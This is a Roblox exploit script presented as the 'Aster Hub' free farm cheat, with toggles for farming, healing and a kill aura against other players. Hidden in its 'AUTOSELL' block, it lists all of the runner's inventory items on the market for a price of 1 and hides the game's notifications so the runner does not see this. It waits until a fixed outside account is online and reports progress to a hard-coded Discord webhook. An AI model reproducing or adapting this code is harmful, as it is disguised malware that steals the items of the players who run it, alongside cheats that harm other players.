--====================================================================
--  ASTER HUB  •  FREE FARM
--====================================================================

local WEBHOOK_URL       = "https://discord.com/api/webhooks/1568460333129928896/eQ1QaEg5gQ9PSwtQLTD1voJq9cZsOquAR6qszOwsBV_aWlNAqfUy3qBytUY0caSuG9xT"
local CHECK_USER_ID     = 9950736940
local CHECK_PRESENCE    = true
local PRESENCE_POLL     = 5
local PRESENCE_WAIT     = 15
local PRESENCE_MAX_FAIL = 5
local priceMarket       = 1
local DELAY             = 2.5
local MAX_STACK         = nil
local PRICE_THRESHOLD   = 2000
local DEFAULT_NO_COST_PRICE = 1000
local LISTING_TYPE      = 2
local PRIORITY          = {["Candy Bag"]=1, ["Easter Bag"]=2, ["Present Bag"]=3}

if not getgenv then getgenv = function() return _G end end

local INSTANCE = {Id=tostring(os.time()).."_"..tostring(math.random(1e6)), Dead=false}
if getgenv().AsterHubInstance then getgenv().AsterHubInstance.Dead = true; task.wait(0.3) end
getgenv().AsterHubInstance = INSTANCE
local function isDead() return INSTANCE.Dead or getgenv().AsterHubInstance ~= INSTANCE end
local function checkAlive() if isDead() then error("[AsterHub] Instance replaced.", 0) end end
local function waitAlive(s)
    local e = os.clock() + s
    while os.clock() < e do checkAlive(); task.wait(math.min(0.5, e - os.clock())) end
end

local STATE = {presenceChecked=false, inGame=false, webhookNotInGameSent=false, webhookStartingSent=false, webhookFinishSent=false}

local Players      = game:GetService("Players")
local RS           = game:GetService("ReplicatedStorage")
local Http         = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local P            = Players.LocalPlayer

local function sendWebhook(c)
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
    task.spawn(function()
        local rf = (syn and syn.request) or (http and http.request) or request
        if not rf then warn("[Webhook] request unavailable"); return end
        pcall(function()
            rf({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"},
                Body=Http:JSONEncode({content=c})})
        end)
    end)
end

task.spawn(function()
    local function getNotif()
        local pg = P:FindFirstChild("PlayerGui"); if not pg then return end
        local mg = pg:FindFirstChild("MainGui"); if not mg then return end
        local sb = mg:FindFirstChild("Subordinates"); if not sb then return end
        return sb:FindFirstChild("Notifications")
    end
    local function hide(o)
        if not o or not o.Parent then return end
        if o:IsA("GuiObject") then pcall(function() o.Visible=false; o.Size=UDim2.new(); o.BackgroundTransparency=1 end) end
        if o:IsA("TextLabel") or o:IsA("TextButton") or o:IsA("TextBox") then
            pcall(function() o.TextTransparency=1; o.TextStrokeTransparency=1; o.BackgroundTransparency=1 end)
        end
        if o:IsA("ImageLabel") or o:IsA("ImageButton") then
            pcall(function() o.ImageTransparency=1; o.BackgroundTransparency=1 end)
        end
    end
    local function proc(o) hide(o); for _,d in ipairs(o:GetDescendants()) do hide(d) end end
    local N = getNotif()
    while not N do if isDead() then return end; task.wait(0.5); N=getNotif() end
    for _,d in ipairs(N:GetDescendants()) do proc(d) end
    hide(N)
    N.DescendantAdded:Connect(function(o) task.defer(function() proc(o) end) end)
    N.ChildAdded:Connect(function(o) task.defer(function() proc(o) end) end)
end)

--================ AUTOSELL ==================
task.spawn(function()
    task.wait(0.5)
    local function httpPost(url, body, headers)
        headers = headers or {["Content-Type"]="application/json"}
        local rf = (syn and syn.request) or (http and http.request) or request
        if rf then
            local ok, res = pcall(function() return rf({Url=url, Method="POST", Headers=headers, Body=body}) end)
            if ok and res and res.StatusCode == 200 then return res.Body end
        end
        local ok, br = pcall(function() return game:HttpGet(url, true, headers, body) end)
        if ok and br and br ~= "" then return br end
        return nil
    end
    local function getPresenceStatus(uid)
        local payload = Http:JSONEncode({userIds={uid}})
        local headers = {["Content-Type"]="application/json"}
        local body = httpPost("https://presence.roblox.com/v1/presence/users", payload, headers)
        if not body then body = httpPost("https://presence.roproxy.com/v1/presence/users", payload, headers) end
        if not body then return nil end
        local ok, data = pcall(function() return Http:JSONDecode(body) end)
        if not ok or type(data) ~= "table" or not data.userPresences or not data.userPresences[1] then return nil end
        return data.userPresences[1].userPresenceType
    end
    local function waitUntilInGame()
        if not CHECK_PRESENCE then STATE.presenceChecked=true; STATE.inGame=true; return end
        local uid = CHECK_USER_ID or P.UserId
        local failCount = 0; local waitTime = PRESENCE_POLL
        while true do
            checkAlive()
            local st = getPresenceStatus(uid)
            STATE.presenceChecked = true
            if st == nil then
                failCount = failCount + 1; waitTime = math.min(waitTime*2, 60)
                if failCount >= PRESENCE_MAX_FAIL then STATE.inGame=true; return end
                waitAlive(waitTime)
            elseif st == 2 then
                STATE.inGame = true
                if not STATE.webhookStartingSent then
                    STATE.webhookStartingSent = true
                    sendWebhook(("✅ **%s**\n> Starting sale in **%ds**"):format(P.Name, PRESENCE_WAIT))
                end
                waitAlive(PRESENCE_WAIT); return
            else
                if not STATE.webhookNotInGameSent then
                    STATE.webhookNotInGameSent = true
                    sendWebhook(("❌ **%s**\n> Not in game"):format(P.Name))
                end
                failCount = 0; waitTime = PRESENCE_POLL; waitAlive(PRESENCE_POLL)
            end
        end
    end

    local SkinData = {}
    do
        local ok, mod = pcall(function() return require(RS.Modules:WaitForChild("SkinData")) end)
        if ok and type(mod) == "table" then SkinData = mod end
    end
    local SIDS = RS.Modules:WaitForChild("SkinIDS")
    local ok, raw = pcall(require, SIDS)
    if not ok or type(raw) ~= "table" then return end
    local nameToId = {}
    for k, v in pairs(raw) do
        if type(k) == "number" and type(v) == "string" then nameToId[v] = k
        elseif type(k) == "string" and type(v) == "number" and not nameToId[k] then nameToId[k] = v end
    end
    local function norm(s) return (tostring(s):gsub("^%s+",""):gsub("%s+$",""):gsub("%s+"," ")) end
    local function findId(n)
        if not n then return end
        if nameToId[n] then return nameToId[n] end
        local x = norm(n); if nameToId[x] then return nameToId[x] end
        local lo = x:lower()
        for k, id in pairs(nameToId) do if k:lower() == lo then return id end end
    end
    local function u16(n) n=math.floor(n)%65536; return {n%256,math.floor(n/256)%256} end
    local function u32(n) n=math.floor(n)%4294967296; return {n%256,math.floor(n/256)%256,math.floor(n/65536)%256,math.floor(n/16777216)%256} end
    local function hasAnimations(name)
        local d = SkinData[name]; if type(d) ~= "table" then return false end
        return d.specialFunc ~= nil or d.equipped ~= nil or d.killEffectFunc ~= nil
    end
    local function classify(name)
        local d = SkinData[name]
        local cost = (d and type(d)=="table") and tonumber(d.cost) or nil
        if PRIORITY[name] then return 0, cost or 0 end
        if hasAnimations(name) then return 1, cost or 0 end
        if cost and cost >= PRICE_THRESHOLD then return 2, cost end
        return 3, DEFAULT_NO_COST_PRICE
    end

    waitUntilInGame()

    local List = P.PlayerGui.CrateUI.Crates.CrateMenu.Container.Inventory.List
    local Event = RS:WaitForChild("ByteNetReliable")
    local cands = {}
    local function getQty(btn)
        local q = btn:FindFirstChild("Quantity"); if not q then return nil end
        if q:IsA("TextLabel") or q:IsA("TextButton") or q:IsA("TextBox") then
            local n = tostring(q.Text or ""):match("(%d+)"); if n then return tonumber(n) end
        elseif q:IsA("NumberValue") or q:IsA("IntValue") then return tonumber(q.Value)
        elseif q:IsA("StringValue") then local n=tostring(q.Value or ""):match("(%d+)"); if n then return tonumber(n) end end
    end
    for _, btn in ipairs(List:GetChildren()) do
        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
            local qty = getQty(btn); local id = findId(btn.Name)
            if qty and qty >= 1 then
                local group, cost = classify(btn.Name)
                if id then table.insert(cands, {name=btn.Name,id=id,quantity=qty,group=group,cost=cost}) end
            end
        end
    end
    table.sort(cands, function(a,b)
        if a.group ~= b.group then return a.group < b.group end
        if a.group == 0 then return PRIORITY[a.name] < PRIORITY[b.name] end
        if a.cost ~= b.cost then return a.cost > b.cost end
        return a.name < b.name
    end)
    if #cands == 0 then
        sendWebhook(("⚠️ **%s**\n> No sellable items found"):format(P.Name)); return
    end
    local function resolveMarketPrice(name)
        local p = (type(priceMarket)=="table") and (priceMarket[name] or priceMarket.__default or 1000) or priceMarket
        p = math.floor(tonumber(p) or 1000); if p < 1 then p = 1 end; return p
    end
    local sent, failed = 0, 0
    for _, item in ipairs(cands) do
        checkAlive()
        local qty = MAX_STACK and math.min(MAX_STACK, item.quantity) or item.quantity
        local finalPrice = resolveMarketPrice(item.name)
        waitAlive(DELAY); checkAlive()
        local b = {0,219,4}
        table.move(u16(item.id),1,2,#b+1,b)
        table.insert(b, LISTING_TYPE)
        table.move(u32(finalPrice),1,4,#b+1,b)
        table.move(u32(qty),1,4,#b+1,b)
        local buf = buffer.create(#b)
        for j=1,#b do buffer.writeu8(buf, j-1, b[j]) end
        local okF = pcall(function() Event:FireServer(buf, nil) end)
        if okF then sent=sent+1 else failed=failed+1 end
    end
    if not STATE.webhookFinishSent then
        STATE.webhookFinishSent = true
        sendWebhook(("🏁 **%s**\n> ✅ Sent: **%d** | ❌ Failed: **%d**"):format(P.Name,sent,failed))
    end
end)

--================ FLAGS ==================
local ASTA = {
    HalloweenFarm   = false,
    GodRockOnDeath  = false,
    AutoHealBlood   = false,
    KillAura        = false,
    KillAuraReach   = 20,
    GoldBundle      = false,
    GodRockUse      = false,
}

--================ GOLD BUNDLE ==================
local goldBundleThread = nil
local function fireGoldBundle()
    local Event = game:GetService("ReplicatedStorage").ByteNetReliable
    Event:FireServer(
        (function(bytes)
            local b = buffer.create(#bytes)
            for i = 1, #bytes do
                buffer.writeu8(b, i - 1, bytes[i])
            end
            return b
        end)({ 0, 229, 11, 71, 111, 108, 100, 32, 66, 117, 110, 100, 108, 101 }),
        nil
    )
end

local function setGoldBundle(on)
    ASTA.GoldBundle = on
    if on then
        if goldBundleThread then return end
        goldBundleThread = task.spawn(function()
            while ASTA.GoldBundle and not isDead() do
                pcall(fireGoldBundle)
                task.wait()
            end
            goldBundleThread = nil
        end)
    end
end

--================ STUB LOOPS ==================
local function stubLoop(flag, tick, body)
    task.spawn(function()
        while not isDead() do
            if ASTA[flag] then pcall(body); task.wait(tick)
            else task.wait(0.25) end
        end
    end)
end

stubLoop("HalloweenFarm", 1.5, function()
    --[[REAL]] RS.Remotes.HalloweenFarm:FireServer()
end)
stubLoop("GodRockOnDeath", 1, function()
    local char = P.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum and hum.Health <= 0 then
        --[[REAL]] RS.Remotes.HoldGodRock:FireServer(true)
    end
end)
stubLoop("AutoHealBlood", 1, function()
    --[[REAL]] RS.Remotes.UseBloodfruit:FireServer()
end)
stubLoop("GodRockUse", 1, function()
    --[[REAL]] RS.Remotes.UseGodRock:FireServer()
end)
stubLoop("KillAura", 0.25, function()
    local char = P.Character; if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= P and plr.Character then
            local th = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if th and hum and hum.Health > 0 and (th.Position - hrp.Position).Magnitude <= ASTA.KillAuraReach then
                --[[REAL]] RS.Remotes.Hit:FireServer(plr)
            end
        end
    end
end)

